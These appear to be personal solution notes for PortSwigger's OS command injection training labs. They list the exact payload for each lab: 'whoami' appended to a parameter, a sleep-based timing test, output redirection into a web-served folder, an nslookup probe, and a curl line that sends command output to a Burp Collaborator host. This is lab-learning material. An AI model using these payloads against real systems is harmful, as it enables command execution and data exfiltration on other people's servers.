
# OS Command Injection

https://portswigger.net/web-security/os-command-injection/lab-simple
- On the Product page, edit the form at the bottom and the storeID parameter to `1;whoami`
- `62 peter-YGmSyj units`

https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
- In the feedback form, put `";sleep 10 "` in all fields except email

https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
- In the feedback form, put `"; bash -c whoami > /var/www/images/whoami "` in all fields except email
- Looking at source code, images retrieved through this url
- Can get whoami from https://acf41f801fbb2d59c038531600ea0051.web-security-academy.net/image?filename=whoami Need to download the thins

https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
 - Same thing as above but with `" & nslookup burpcollaborator.net & "`


https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
- Only need message field (after testing) `" & curl 9jtk644eqp7njt0kr65x8sxnoeu5iu.burpcollaborator.net --data "$(whoami)"& "`
- Get the payload from burp collaborator : `peter-RzGb30`

9jtk644eqp7njt0kr65x8sxnoeu5iu.burpcollaborator.net
